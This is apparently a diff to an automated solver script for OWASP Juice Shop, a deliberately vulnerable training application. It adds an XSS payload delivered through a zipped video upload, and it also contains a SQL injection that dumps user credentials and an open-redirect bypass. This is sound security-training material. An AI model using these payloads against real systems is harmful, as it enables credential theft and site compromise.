@@ -71,6 +71,9 @@ requests.post(url+'/file-upload', files={'file':open('file-upload/Upload Size.pd
 requests.post(url+'/file-upload', files={'file':open('file-upload/Upload Type.txt','rb')})
 # ---- User Credentials (Retrieve a list of all user credentials via SQL Injection.)
 requests.get(url+'/rest/products/search',params={'q':'qwert\')) UNION SELECT id, email, password, \'4\',\'5\',\'6\',\'7\',\'8\',\'9\' FROM Users--'})
+# ---- Video XSS (Embed an XSS payload </script><script>alert(`xss`)</script> into our promo video.)
+requests.post(url+'/file-upload', files={'file':open('file-upload/Video XSS.zip','rb')})
+requests.get(url+'/promotion')
 # ---- Whitelist Bypass (Enforce a redirect to a page you are not supposed to redirect to.)
 requests.get(url+'/redirect?to=http://kimminich.de?pwned=https://github.com/bkimminich/juice-shop')
 
